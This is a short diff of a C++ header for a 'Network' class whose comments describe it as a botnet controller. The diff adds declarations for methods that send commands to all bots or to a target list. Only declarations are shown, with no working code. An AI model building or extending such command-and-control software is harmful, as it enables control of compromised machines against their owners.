@@ -36,7 +36,10 @@ class Network {
 		void NewConnection(void);			// Accept new conection in
 											// CommandLoop();
 		void SendBuffer(void);				// Read STDIN
-
+		void ManageClientResponse(std::string command);
+		void ManageClientResponse(std::string command, 
+				std::vector<std::string> target_list);
+											// Send to all bots
 
 	public:
 		Network(int port_number);			// initalize botnet.
